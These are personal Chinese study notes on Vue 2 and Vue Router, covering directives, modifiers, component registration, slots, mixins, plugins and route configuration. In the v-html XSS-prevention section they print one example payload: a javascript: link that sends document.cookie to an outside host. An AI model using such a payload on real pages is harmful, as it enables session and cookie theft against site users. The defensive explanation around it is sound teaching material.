## Vue2.x

### 生命周期

#### 父子组件生命周期执行顺序

- **加载渲染过程**

> **->父beforeCreate -> 父created -> 父beforeMount** 
>
> ***\->\******子beforeCreate -> 子created -> 子beforeMount -> 子mounted**
>
> **-> 父mounted**

- **子组件更新过程**

> **->父beforeUpdate**
>
> **-> 子beforeUpdate -> 子updated**
>
> **-> 父updated**

- **父组件更新过程**

> **父beforeUpdate -> 父updated**

- **销毁过程**

> **-> 父beforeDestroy**
>
> **-> 子beforeDestroy** **-> 子destroyed**
>
> **-> 父destroyed**

#### vue的生命周期

![](C:\Users\刘颖\Pictures\笔记\vue生命周期.png)



### Class与Style

#### Class 绑定HTML Class

​	对象里每一个键值对，键为类名，值为布尔类型 v-bind:class可以与普通的class一起用，

​    数组里的项是类名，数组中可以写对象

#### Style 绑定内联样式

`v-bind:style` 的对象语法十分直观——看着非常像 CSS，但其实是一个 JavaScript 对象。CSS property 名可以用驼峰式 (camelCase) 或短横线分隔 (kebab-case，记得用引号括起来) 来命名



### 模板语法

#### {{}}

​	大胡子语法

#### v-text

​	会把标签中的内容覆盖替换掉

#### v-html

​	将标签语义化展示在页面

​	容易产生xss攻击，应该只对可信内容使用HTML插值

##### 	如何防止xss攻击？

​	1.前端过滤

​	2.后台转义

```
    (<> 转为 &lt; &gt;)
```

3. 给cookie加上属性

   ```
   <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
   ```

   #### 总结

   ```
   1.虽然上面三种方法都可以将数据渲染到页面上，但是工作中我最常用的是'{{}}'
   2.'{{}}' 最被常用但是在加载的时候会出现闪烁问题(指令篇章v-cloak会讲解解决方
   法)，而且只能吧html标签当字符串渲染
   3.'v-text' 虽然没有数据加载闪烁问题，但是会将标签中间的数据覆盖，也不能渲
   染html格式数据。
   4.'v-html' 谨慎使用会出现xss攻击的风险
   ```

   

### 指令用法

#### v-show与v-if

##### v-if

​	v-if如果复用，和key联合使用。

​	v-if在 '<template>' 元素上配合 v-if 使用的好处，就是可以将'<template>'作为一个整
体，且渲染的时候不显示'<template>'

##### v-show

​	不支持template元素，也不支持v-else

##### 二者区别

```
1.v-if 的特点：每次都会重新删除或创建元素("条件块内的事件监听器和子组件适当地被销毁和重建"),
v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块
2.v-show 的特点：不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换 ,
每次不会重新进行DOM的删除和创建操作，只是切换了元素的 display:none 样式
3.v-if 有较高的切换性能消耗
4.v-show 有较高的初始渲染消耗(不管真假都创建。v-if 只有真才创建)
5. 如果元素涉及到频繁的切换，最好不要使用 v-if, 而是推荐使用 v-show
6. 如果元素可能永远也不会被显示出来被用户看到，则推荐使用 v-if 
```

#### v-if与v-for

> v-for比v-if有更高的优先级，会先循环后if判断
>
> 永远不要把v-if与v-for同时用在一个元素

##### 具体实际应用

v-if与v-for不要搭配使用，建议用在计算属性里做好判断，然后用v-for循环

或者把v-if判断放在v-for外（即容器元素）

具体参考https://www.kancloud.cn/cyyspring/vuejs/1129238



#### 自定义事件

##### 自定义组件的v-model

一个组件上的 `v-model` 默认会利用名为 `value` 的 prop 和名为 `input` 的事件，但是像单选框、复选框等类型的输入控件可能会将 `value` attribute 用于[不同的目的](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/input/checkbox#Value)。`model` 选项可以用来避免这样的冲突：

```js
Vue.component('base-checkbox', {
  model: {
    prop: 'checked',
    event: 'change'
  },
  props: {
    checked: Boolean
  },
  template: `
    <input
      type="checkbox"
      v-bind:checked="checked"
      v-on:change="$emit('change', $event.target.checked)"
    >
  `
})
```

现在在这个组件上使用 `v-model` 的时候：

```js
<base-checkbox v-model="lovingVue"></base-checkbox>
```

这里的 `lovingVue` 的值将会传入这个名为 `checked` 的 prop。同时当 `<base-checkbox>` 触发一个 `change` 事件并附带一个新的值的时候，这个 `lovingVue` 的 property 将会被更新。

注意你仍然需要在组件的 `props` 选项里声明 `checked` 这个 prop



##### `.sync` 修饰符 

> 2.3.0+ 新增

在有些情况下，我们可能需要对一个 prop 进行“双向绑定”。不幸的是，真正的双向绑定会带来维护上的问题，因为子组件可以变更父组件，且在父组件和子组件两侧都没有明显的变更来源。

这也是为什么我们推荐以 `update:myPropName` 的模式触发事件取而代之。举个例子，在一个包含 `title` prop 的假设的组件中，我们可以用以下方法表达对其赋新值的意图：

```js
this.$emit('update:title', newTitle)
```

然后父组件可以监听那个事件并根据需要更新一个本地的数据 property。例如：

```js
<text-document
  v-bind:title="doc.title"
  v-on:update:title="doc.title = $event"
></text-document>
```

为了方便起见，我们为这种模式提供一个缩写，即 `.sync` 修饰符：

```js
<text-document v-bind:title.sync="doc.title"></text-document>
```

**注意**

带 `.sync` 修饰符的 `v-bind` **不能**和表达式一起使用 (例如 `v-bind:title.sync=”doc.title + ‘!’”` 无效，只能提供你想要绑定的 property 名，类似 `v-model`。



当用一个对象同时设置多个 prop 的时候，也可以将这个 `.sync` 修饰符和 `v-bind` 配合使用：

```js
<text-document v-bind.sync="doc"></text-document>
```

这样会把 `doc` 对象中的每一个 property (如 `title`) 都作为一个独立的 prop 传进去，然后各自添加用于更新的 `v-on` 监听器。

将 `v-bind.sync` 用在一个字面量的对象上，例如 `v-bind.sync=”{ title: doc.title }”`，无法正常工作。



#### 自定义指令

```
在 Vue2.0 中，代码复用和抽象的主要形式是组件。然而，有的情况下，你仍然需要对普通 DOM 元素进行底层操作，这时候就会用到'自定义指令'。
```

出现原因：对普通DOM元素进行底层操作

##### 用法详解

```
1.使用 Vue.directive() 定义全局的指令
2.第一参数是自定义组件名称
3.第二个参数是一个对象，对象中包含了一些钩子函数(均为可选)依次是：
    3.1.'bind'：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置。
    3.2.'inserted'：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。
    3.3.'update'：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的
       值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新 
    3.4.'componentUpdated'：指令所在组件的 VNode及其子 VNode全部更新后调用。
    3.5.'unbind'：只调用一次，指令与元素解绑时调用。
    注：其中bind，inserted，unbind 是只调用一次，update是一些 属性重新生调用

4.这些钩子函数中参数依次为 'el、binding、vnode 和 oldVnode'
    4.1.'el' 是当前绑定自定义的dom元,可以直接操作dom
    4.2.'binding'是一个和自定义指令相关的对象内容包含依次如下：
        4.2.1.'name'：获取指令名，这里的指令名指的是不包括'v-'前缀。
        4.2.2.'value'：获取指令的绑定值，例如：v-my-directive="1 + 1" 中，绑定值为 2
        4.2.3.'oldValue'：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。
              无论值是否改变都可用。
        4.2.4.'expression'：字符串形式的指令表达式。例如 v-my-directive="1 + 1" 中，表达式为 "1 + 1"。
        4.2.5.'arg'：传给指令的参数，可选。例如'v-my-directive:foo'中，参数为"foo"。
        4.2.6.'modifiers'：一个包含修饰符的对象。例如：'v-my-directive.foo.bar'中，
               修饰符对象为`{ foo: true, bar: true }`。
    4.3.'vnode'：Vue 编译生成的虚拟节点
    4.4.'oldVnode'：上一个虚拟节点，仅在'update'和'componentUpdated'钩子中可用
```



### [修饰符](https://blog.csdn.net/wqliuj/article/details/108654103)

#### 事件修饰符

.stop 阻止事件继续传播

.prevent 阻止标签默认行为

.capture 使用事件捕获模式,即元素自身触发的事件先在此处处理，然后才交由内部元素进行处理

.self 只当在 event.target 是当前元素自身时触发处理函数

.once 事件将只会触发一次

.passive 告诉浏览器你不想阻止事件的默认行为

**使用修饰符时，顺序很重要；相应的代码会以同样的顺序产生。因此，用`v-on:click.prevent.self`会阻止所有的点击，而 `v-on:click.self.prevent` 只会阻止对元素自身的点击。**



#### v-model的修饰符

<1> .lazy
默认情况下，v-model同步输入框的值和数据。可以通过这个修饰符，转变为在change事件再同步。

```html
<input v-model.lazy="msg">
```


<2> .number
自动将用户的输入值转化为数值类型

```html
<input v-model.number="msg">
```


<3> .trim
自动过滤用户输入的首尾空格

```html
<input v-model.trim="msg">
```



#### 键盘事件的修饰符

在我们的项目经常需要监听一些键盘事件来触发程序的执行，而Vue中允许在监听的时候添加关键修饰符：

```html
<input v-on:keyup.13="submit">
```

对于一些常用键，还提供了按键别名：

```html
<input @keyup.enter="submit">      <!-- 缩写形式 -->
```



##### 全部的按键别名

.enter
.tab
.delete (捕获“删除”和“退格”键)
.esc
.space
.up
.down
.left
.right

##### 修饰键

.ctrl
.alt
.shift
.meta

```html
<!-- Alt + C -->
<input @keyup.alt.67="clear">
<!-- Ctrl + Click -->
<div @click.ctrl="doSomething">Do something</div>
```



与按键别名不同的是，修饰键和 keyup 事件一起用时，事件引发时必须按下正常的按键。

换一种说法：如果要引发 keyup.ctrl，必须按下 ctrl 时释放其他的按键；单单释放 ctrl 不会引发事件。

```html
<!-- 按下Alt + 释放C触发 -->
<input @keyup.alt.67="clear">

<!-- 按下Alt + 释放任意键触发 -->
<input @keyup.alt="other">

<!-- 按下Ctrl + enter时触发 -->
<input @keydown.ctrl.13="submit">
```



#### element的修饰符

对于elementUI的input，我们需要在后面加上.native, 因为elementUI对input进行了封装，原生的事件不起作用。

```html
<input v-model="form.name" placeholder="昵称" @keyup.enter="submit">

<el-input v-model="form.name" placeholder="昵称" @keyup.enter.native="submit"></el-input>

```



#### 组件注册

##### 全局注册

至此，我们的组件都只是通过 `Vue.component` 全局注册的：

```js
Vue.component('my-component-name', {
  // ... options ...
})
```

##### 局部注册

全局注册往往是不够理想的。比如，如果你使用一个像 webpack 这样的构建系统，全局注册所有的组件意味着即便已经不再使用一个组件了，它仍然会被包含在最终的构建结果中。

这造成了用户下载的 JavaScript 的无谓的增加。

在这些情况下，可以通过一个普通的 JavaScript 对象来定义组件：

```js
var ComponentA = { /* ... */ }
var ComponentB = { /* ... */ }
var ComponentC = { /* ... */ }
```

然后在 `components` 选项中定义你想要使用的组件：

```js
new Vue({
  el: '#app',
  components: {
    'component-a': ComponentA,
    'component-b': ComponentB
  }
})
```

对于 `components` 对象中的每个 property 来说，其 property 名就是自定义元素的名字，其 property 值就是这个组件的选项对象。

注意**局部注册的组件在其子组件中\*不可用\***。例如，如果希望 `ComponentA` 在 `ComponentB` 中可用，则需要这样写：

```js
var ComponentA = { /* ... */ }

var ComponentB = {
  components: {
    'component-a': ComponentA
  },
  // ...
}
```

或者如果通过 Babel 和 webpack 使用 ES2015 模块，那么代码看起来更像：

```js
import ComponentA from './ComponentA.vue'

export default {
  components: {
    ComponentA
  },
  // ...
}

```

#### 动态组件

一个多标签的界面中使用 `is` attribute 来切换不同的组件：

```js
<component v-bind:is="currentTabComponent"></component>
```

当在这些组件之间切换，想保持这些组件的状态，以避免反复重渲染导致的性能问题，可以用一个 `<keep-alive>` 元素将其动态组件包裹起来

```js
<!-- 失活的组件将会被缓存！-->
<keep-alive>
  <component v-bind:is="currentTabComponent"></component>
</keep-alive>
```

**keep-alive注意点**

注意这个 `<keep-alive>` 要求被切换到的组件都有自己的名字，不论是通过组件的 `name` 选项还是局部/全局注册。



#### 异步组件

Vue 允许以一个工厂函数的方式定义组件，这个工厂函数会异步解析组件定义。

Vue 只有在这个组件需要被渲染的时候才会触发该工厂函数，且会把结果缓存起来供未来重渲染。

```js
Vue.component('async-example', function (resolve, reject) {
  setTimeout(function () {
    // 向 `resolve` 回调传递组件定义
    resolve({
      template: '<div>I am async!</div>'
    })
  }, 1000)
})
```

这个工厂函数会收到一个 `resolve` 回调，这个回调函数会在从服务器得到组件定义的时候被调用。

也可以调用 `reject(reason)` 来表示加载失败。

这里的 `setTimeout` 是为了演示用的，如何获取组件取决于你自己。



推荐的做法是将异步组件和 webpack 的 code-splitting 功能一起配合使用：

```js
Vue.component('async-webpack-example', function (resolve) {
  // 这个特殊的 `require` 语法将会告诉 webpack
  // 自动将你的构建代码切割成多个包，这些包
  // 会通过 Ajax 请求加载
  require(['./my-async-component'], resolve)
})
```

也可以在工厂函数中返回一个 `Promise`，所以把 webpack 2 和 ES2015 语法加在一起，可以这样使用动态导入：

```js
Vue.component(
  'async-webpack-example',
  // 这个动态导入会返回一个 `Promise` 对象。
  () => import('./my-async-component')
)
```

当使用局部注册的时候，也可以直接提供一个返回 `Promise` 的函数：

```js
new Vue({
  // ...
  components: {
    'my-component': () => import('./my-async-component')
  }
})
```

##### 处理加载状态

> 2.3.0+ 新增

这里的异步组件工厂函数也可以返回一个如下格式的对象：

```js
const AsyncComponent = () => ({  // 需要加载的组件 (应该是一个 `Promise` 对象)  component: import('./MyComponent.vue'),  // 异步组件加载时使用的组件  loading: LoadingComponent,  // 加载失败时使用的组件  error: ErrorComponent,  // 展示加载时组件的延时时间。默认值是 200 (毫秒)  delay: 200,  // 如果提供了超时时间且组件加载也超时了，  // 则使用加载失败时使用的组件。默认值是：`Infinity`  timeout: 3000})
```

> 注意如果希望在 Vue Router 的路由组件中使用上述语法的话，必须使用 Vue Router 2.4.0+ 版本。



### 过滤器

#### 过滤器的定义

![过滤器的定义](C:\Users\刘颖\Documents\Screenshot\过滤器的定义.png)

#### 过滤器接收参数

![过滤器的参数](C:\Users\刘颖\Documents\Screenshot\过滤器的参数.png)



#### 过滤器的应用

![过滤器的应用场景](C:\Users\刘颖\Documents\Screenshot\过滤器的应用场景.png)



### 插件

通常用来为Vue添加全局功能。

#### 使用插件

通过全局方法Vue.use()使用插件，需要在调用new Vue()启动应用之前完成。

Vue.js官方提供的一些插件（例如vue-router）在检测到Vue是可访问的全局变量时会自动调用Vue.use()，然而在像CommonJS这样的模块环境中，应该始终显式调用Vue.use()

#### 功能范围

1. 添加全局方法或者 property。如：vue-custom-element
2. 添加全局资源：指令/过滤器/过渡等。如 vue-touch
3. 通过全局混入来添加一些组件选项。如 vue-router
4. 添加 Vue 实例方法，通过把它们添加到 `Vue.prototype` 上实现。
5. 一个库，提供自己的 API，同时提供上面提到的一个或多个功能。如 vue-router

使用插件 全局方法Vue.use()

- 通过全局方法 `Vue.use()` 使用插件
- 需要在你调用 `new Vue()` 启动应用之**前**完成

```js
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin)

new Vue({
  // ...组件选项
})
```

也可以传入一个可选的选项对象：

```js
Vue.use(MyPlugin, { someOption: true })
```

`Vue.use` 自动阻止多次注册相同插件，即使多次调用也只会注册一次该插件。

Vue.js 官方提供的一些插件 (例如 `vue-router`) 在检测到 `Vue` 是可访问的全局变量时会自动调用 `Vue.use()`。然而在像 CommonJS 这样的模块环境中，应该**始终显式地调用** `Vue.use()`

```
// 用 Browserify 或 webpack 提供的 CommonJS 模块环境时
var Vue = require('vue')
var VueRouter = require('vue-router')

// 不要忘了调用此方法
Vue.use(VueRouter)
```

#### 开发插件

Vue.js 的插件应该暴露一个 `install` 方法。这个方法的第一个参数是 `Vue` 构造器，第二个参数是一个可选的选项对象：

```js
MyPlugin.install = function (Vue, options) {
  // 1. 添加全局方法或 property
  Vue.myGlobalMethod = function () {
    // 逻辑...
  }

  // 2. 添加全局资源
  Vue.directive('my-directive', {
    bind (el, binding, vnode, oldVnode) {
      // 逻辑...
    }
    ...
  })

  // 3. 注入组件选项
  Vue.mixin({
    created: function () {
      // 逻辑...
    }
    ...
  })

  // 4. 添加实例方法
  Vue.prototype.$myMethod = function (methodOptions) {
    // 逻辑...
  }
}
```





#### 案例 自定义插件开发与使用

开发插件

![](C:\Users\刘颖\Documents\tips截图\【VUE基础】自定义插件一.png)

使用插件，使用Vue.use()

![](C:\Users\刘颖\Documents\tips截图\【VUE基础】自定义插件二.png)

![](C:\Users\刘颖\Documents\tips截图\【VUE基础】自定义插件三.png)



#### 引入第三方UI框架和第三方框架

babel-plugin-import是一款 babel 插件，它会在编译过程中将 import 的写法自动转换为按需引入的方式

**方法一：配置 webpack ProvidePlugin 全局引入**

假设要使用到 jquery，那么可以通过配置 webpack 的 ProvidePlugin 的插件来全局引入：

```js
new webpack.ProvidePlugin({
 $: 'jquery',
 jQuery: 'jquery'
})

```

**方法二：包装成插件在 Vue 中调用 use 方法安装**

另外一种比较靠谱的方法是将第三方模块打包成插件，如我需要全局使用 echarts，那么在 src 目录下新建一个 lib，并创建名为 echarts.js 的文件：

```js
import echarts from 'echarts'

export default {
 install (Vue) {
  Object.defineProperty(Vue.prototype, '$echarts', {
   value: echarts
  })
 }
}
```

上述代码 export 一个对象，对象包含一个 install 方法，该方法的参数是 Vue 构造函数，我们使用 Object.defineProperty 或 Reflect 的方法将 $echarts 定义到 Vue.prototype 中去。

然后在项目中使用：

```js
import echarts from './lib/echarts'

Vue.use(echarts) // use

new Vue({
  // ...
}).$mount('#app')

```

这样就可以在 vue 实例中通过 $echarts 来使用

```js
// ...
let myChart = this.$echarts.init(this.$refs.main)
// ...

```

**其他方法**

其他还有在 window 对象中全局定义；或使用 Vue.prototype.xxx = xxx 等，都存在各样问题，如 window 会导致全局作用域污染；后者定义方式不可靠，比方说 echarts 模块太大，会经常出现扩展定义失败导致的报错



#### 引入element

##### 完整引入

在 main.js 中写入以下内容：

```javascript
import Vue from 'vue';
import ElementUI from 'element-ui';
import 'element-ui/lib/theme-chalk/index.css';
import App from './App.vue';

Vue.use(ElementUI);

new Vue({
  el: '#app',
  render: h => h(App)
});
```

以上代码便完成了 Element 的引入。需要注意的是，样式文件需要单独引入。

##### 按需引入

借助 babel-plugin-component，我们可以只引入需要的组件，以达到减小项目体积的目的。

首先，安装 babel-plugin-component：

```bash
npm install babel-plugin-component -D
```

然后，将 .babelrc 修改为：

```json
{
  "presets": [["es2015", { "modules": false }]],
  "plugins": [
    [
      "component",
      {
        "libraryName": "element-ui",
        "styleLibraryName": "theme-chalk"
      }
    ]
  ]
}
```

接下来，如果只希望引入部分组件，比如 Button 和 Select，那么需要在 main.js 中写入以下内容：

```javascript
import Vue from 'vue';
import { Button, Select } from 'element-ui';
import App from './App.vue';

Vue.component(Button.name, Button);
Vue.component(Select.name, Select);
/* 或写为
 * Vue.use(Button)
 * Vue.use(Select)
 */

new Vue({
  el: '#app',
  render: h => h(App)
});
```



#### Vue.use()

#### 场景

`Vue.use(VueRouter)`、`Vue.use(MintUI)`。但是用 `axios`时，就不需要用 `Vue.use(axios)`，就能直接使用。那这是为什么呐？

#### 答案

axios没有install。

自定义需要一个Vue.use()的组件，就是有install的组件。

因为Axios本身就不是Vue的组件，它是通用化AJAX库，它不是为了Vue而存在的，而是$.ajax的替代解决方案，仅此而已。
提供install方法，只是为了让Vue可以将组件注册到框架里去





### 插槽

##### 插槽内容

Vue 实现了一套内容分发的 API，将 `<slot>` 元素作为承载分发内容的出口。

##### 编译作用域

父级模板里的所有内容都是在父级作用域中编译的；子模板里的所有内容都是在子作用域中编译的。

##### 后备内容

后备内容放在 `<slot>` 标签内。

不提供任何插槽内容时，后备内容将会被渲染。

如果提供内容，提供的内容将取后备内容渲染。

##### 具名插槽

`<slot>` 元素有一个特殊的 attribute：`name`。这个 attribute 可以用来定义额外的插槽，一个不带 `name` 的 `<slot>` 出口会带有隐含的名字“default”。

在向具名插槽提供内容的时候，可以在一个 `<template>` 元素上使用 `v-slot` 指令，并以 `v-slot` 的参数的形式提供其名称

```js
<base-layout>
  <template v-slot:header>
    <h1>Here might be a page title</h1>
  </template>

  <p>A paragraph for the main content.</p>
  <p>And another one.</p>

  <template v-slot:footer>
    <p>Here's some contact info</p>
  </template>
</base-layout>
```

现在 `<template>` 元素中的所有内容都将会被传入相应的插槽。任何没有被包裹在带有 `v-slot` 的 `<template>` 中的内容都会被视为默认插槽的内容。

##### 作用域插槽

为了让 `user` 在父级的插槽内容中可用，我们可以将 `user` 作为 `<slot>` 元素的一个 attribute 绑定上去

绑定在 `<slot>` 元素上的 attribute 被称为**插槽 prop**。现在在父级作用域中，我们可以使用带值的 `v-slot` 来定义我们提供的插槽 prop 的名字：

```js
<current-user>
  <template v-slot:default="slotProps">
    {{ slotProps.user.firstName }}
  </template>
</current-user>
```

在这个例子中，我们选择将包含所有插槽 prop 的对象命名为 `slotProps`，但也可以使用任意的名字。

###### 独占默认插槽的缩写语法

当被提供的内容**只有默认插槽**时，组件的标签才可以被当作插槽的模板来使用。这样我们就可以把 `v-slot` 直接用在组件上：

```js
<current-user v-slot:default="slotProps">
  {{ slotProps.user.firstName }}
</current-user>
```

这种写法还可以更简单。就像假定未指明的内容对应默认插槽一样，不带参数的 `v-slot` 被假定对应默认插槽：

```js
<current-user v-slot="slotProps">
  {{ slotProps.user.firstName }}
</current-user>
```

默认插槽的缩写语法不能与具名插槽混用，会导致作用域不明确

只要出现多个插槽，应该使用完整的机遇template的语法

```js
<current-user>
  <template v-slot:default="slotProps">
    {{ slotProps.user.firstName }}
  </template>

  <template v-slot:other="otherSlotProps">
    ...
  </template>
</current-user>
```

###### 结构插槽Prop

作用域插槽的内部工作原理是将插槽内容包裹在一个拥有单个参数的函数里，这意味着 `v-slot` 的值实际上可以是任何能够作为函数定义中的参数的 JavaScript 表达式。

所以在支持的环境下 (单文件组件或现代浏览器)，你也可以使用 ES2015 解构来传入具体的插槽 prop：

```js
<current-user v-slot="{ user }">
  {{ user.firstName }}
</current-user>
```

这样可以使模板更简洁，尤其是在该插槽提供了多个 prop 的时候。它同样开启了 prop 重命名等其它可能，例如将 `user` 重命名为 `person`：

```js
<current-user v-slot="{ user: person }">
  {{ person.firstName }}
</current-user>
```

你甚至可以定义后备内容，用于插槽 prop 是 undefined 的情形：

```js
<current-user v-slot="{ user = { firstName: 'Guest' } }">
  {{ user.firstName }}
</current-user>
```



### 混入

混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项

##### 选项合并

当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。

比如，数据对象在内部会进行递归合并，并在发生冲突时以**组件数据优先**。

```js
var mixin = {
  data: function () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子**之前**调用。

值为对象的选项，例如 `methods`、`components` 和 `directives`，将被合并为同一个对象。两个对象键名冲突时，取**组件对象的键值对**。

> `Vue.extend()` 也使用同样的策略进行合并。

##### 全局混入

混入也可以进行全局注册。使用时格外小心！一旦使用全局混入，它将影响**每一个**之后创建的 Vue 实例。使用恰当时，这可以用来为自定义选项注入处理逻辑。

```JS
// 为自定义的选项 'myOption' 注入一个处理器。
Vue.mixin({
  created: function () {
    var myOption = this.$options.myOption
    if (myOption) {
      console.log(myOption)
    }
  }
})

new Vue({
  myOption: 'hello!'
})
// => "hello!"
```

请谨慎使用全局混入，因为它会影响每个单独创建的 Vue 实例 (包括第三方组件)。大多数情况下，只应当应用于自定义选项，就像上面示例一样。推荐将其作为**插件**发布，以避免重复应用混入。





### watch与computed

##### vm.$watch(expOrFn，callback，[options])

![](C:\Users\刘颖\Documents\tips截图\【vm】watcher.png)

用于观察一个**表达式**或**computed函数**在vue实例上的变化。表达式只接受**以点分割**的路径

返回一个取消观察函数，用来停止触发回调。



#### immediate:true

第一次渲染的时候不会执行，如果想让第一次就监听使用immediate或者直接计算属性，其中在handler方法中监听新旧值

#### deep

监听对象内部内容，因为对象是一个地址，内部内容改变，但是地址没变就监听不到，所以此时需要deep

为了发现对象内部值的变化，可以在选项参数中指定deep:true，监听**数组**的变动**不需要**这么做

#### 优化建议

绑定监听浪费性能，如果只监听一项，就写一个子串“obj.a”的形式



#### vm.$

所有以vm.$开头的方法，都是在Vue.js原型上设置的。



### Vue页面顺序

vue页面顺序规范https://www.cnblogs.com/isylar/p/11224232.html

> name: 组件名
>
> components 应用组件
>
> props 接收来自父组件的数据，可以是数组，也可以是对象
>
> data() 实例的数据对象 
>
> computed 计算属性
>
> watch 侦听属性
>
> mixins  
>
> 生命周期钩子函数
>
> methods



## Vue-router

#### VueRouter  匹配优先级

同一个路径匹配多个路由，匹配的优先级按照路由的定义顺序，先定义的优先级高

含有通配符的路由应该放在最后，路由 `{ path: '*' }` 通常用于客户端 404 错误

#### 嵌套路由注意点

> 要在嵌套的出口中渲染组件，需要在 `VueRouter` 的参数中使用 `children` 配置

**以 `/` 开头的嵌套路径会被当作根路径。 可供充分使用嵌套组件而无须设置嵌套的路径**

```
使用 children 属性，实现子路由，同时，子路由的 path 前面，不要带 / ，否则永远以根路径开始请求，这样不方便我们用户去理解URL地址
```

#### 动态路由

一个‘路径参数'使用 ：标记

##### 动态参数变化 组件不会被渲染

```
简单的说就是不会触发生命周期初始化时候从'beforeCreate'到'mounted'这个
区间的生命周期，而是认为是相同组件每次只会更新'beforeUpdated'和'updated'。
一般情况下在一些初始化操作例如 接口请求的时候会在'beforeCreate'到'mounted'这个
区间的生命周期来请求接口，因为动态路由的缘故从 /user/foo 导航到 /user/bar 是不会再触发这些生命周期相对的替代办法。
```

1.使用’watch‘监听重新触发

```js
const User = {
  template: '...',
  watch: {
    '$route' (to, from) {
      // 对路由变化作出响应...
    }
  }
}
```

2.用’beforeRouteUpdate‘导航守卫

```js
const User = {
  template: '...',
  beforeRouteUpdate (to, from, next) {
    // react to route changes...
    // don't forget to call next()
  }
}
```

#### 命名路由

```
1.上面的案例都是通过'router-link' 中的'to'属性和制定的连接进行搭配跳转，
命名路由则是，路由中定义的名字进行跳转
2.思考为什么要这么做，首先在路由的时候，我们定义了一个组件和一个
对应的跳转链接，链接我们已经在路由阶段定义好了，那么是否还需要在
'router-link' 在定义一次呢？其实这个就是利用了命名路由，我们在配置路由
的时候加一个name，让name和'router-link' 进行匹配
3. 书写时候注意，'router-link'的'to' 要用'v-bind' 去绑定，注意'name' 对着的value
是变量是字符串。
```

#### 命名视图 离谱 也是一种应用



#### $router 路由函数使用

```
关于'VueRouter'实例的路由对象内部会有关于路由相关的方法，其中'currentRoute'为当前路由对应
  的路由信息对象也就是下一章节要说的'$route' 
```

```、
$router.currentRoute   $route
```

##### 路由跳转 声明式和编程式 

```
在官方文档中有解释道'<router-link :to="..."> 声明式写法'，'router.push(...)编程式写法'，
点击 <router-link :to="..."> 等同于调用 router.push(...)
```

this.$router.push

> 1.this.$router.push('参数是路由地址')-- 跳转指定页
> 2.注意push 是在 history 栈添加一个新的记录，因此当使用后退功能的时候可以后退到上一个网址
> 3.注意push路径参数都不带斜杠
> 4.当你点击 <router-link> 时，这个方法会在内部调用，所以说，点击 <router-link :to="..."> 等同于调用 router.push(...)
>
> 5.如果提供了path，params会被忽略

#### 路由组件传参（路由解耦） 使用props

在组件中使用 `$route` 会使之与其对应路由形成高度耦合，从而使组件只能在某些特定的 URL 上使用，限制了其灵活性。

使用 `props` 将组件和路由解耦：

**取代与 `$route` 的耦合**

```js
const User = {
  template: '<div>User {{ $route.params.id }}</div>'
}
const router = new VueRouter({
  routes: [{ path: '/user/:id', component: User }]
})
```

**通过 `props` 解耦**

```js
const User = {
  props: ['id'],
  template: '<div>User {{ id }}</div>'
}
const router = new VueRouter({
  routes: [
    { path: '/user/:id', component: User, props: true },

    // 对于包含命名视图的路由，你必须分别为每个命名视图添加 `props` 选项：
    {
      path: '/user/:id',
      components: { default: User, sidebar: Sidebar },
      props: { default: true, sidebar: false }
    }
  ]
})
```

这样你便可以在任何地方使用该组件，使得该组件更易于重用和测试

##### 布尔模式

如果 `props` 被设置为 `true`，`route.params` 将会被设置为组件属性。

##### 对象模式

如果 `props` 是一个对象，它会被按原样设置为组件属性。当 `props` 是静态的时候有用。

```js
const router = new VueRouter({
  routes: [
    {
      path: '/promotion/from-newsletter',
      component: Promotion,
      props: { newsletterPopup: false }
    }
  ]
})
```

##### 函数模式

你可以创建一个函数返回 `props`。这样你便可以将参数转换成另一种类型，将静态值与基于路由的值结合等等。

```js
const router = new VueRouter({
  routes: [
    {
      path: '/search',
      component: SearchUser,
      props: route => ({ query: route.query.q })
    }
  ]
})
```

URL `/search?q=vue` 会将 `{query: 'vue'}` 作为属性传递给 `SearchUser` 组件。

请尽可能保持 `props` 函数为无状态的，因为它只会在路由发生变化时起作用。如果你需要状态来定义 `props`，请使用包装组件，这样 Vue 才可以对状态变化做出反应。



#### 路由元信息（meta）

应用：配合路由守卫，检查是否登录

定义路由的时候可以配置 `meta` 字段：

```js
const router = new VueRouter({
  routes: [
    {
      path: '/foo',
      component: Foo,
      children: [
        {
          path: 'bar',
          component: Bar,
          // a meta field
          meta: { requiresAuth: true }
        }
      ]
    }
  ]
})
```

那么如何访问这个 `meta` 字段呢？

首先，我们称呼 `routes` 配置中的每个路由对象为 **路由记录**。路由记录可以是嵌套的，因此，当一个路由匹配成功后，他可能匹配多个路由记录

例如，根据上面的路由配置，`/foo/bar` 这个 URL 将会匹配父路由记录以及子路由记录。

一个路由匹配到的所有路由记录会暴露为 `$route` 对象 (还有在导航守卫中的路由对象) 的 `$route.matched` 数组。因此，我们需要遍历 `$route.matched` 来检查路由记录中的 `meta` 字段。

下面例子展示在全局导航守卫中检查元字段：

```js
router.beforeEach((to, from, next) => {
  if (to.matched.some(record => record.meta.requiresAuth)) {
    // this route requires auth, check if logged in
    // if not, redirect to login page.
    if (!auth.loggedIn()) {
      next({
        path: '/login',
        query: { redirect: to.fullPath }
      })
    } else {
      next()
    }
  } else {
    next() // 确保一定要调用 next()
  }
})
```

#### 滚动行为

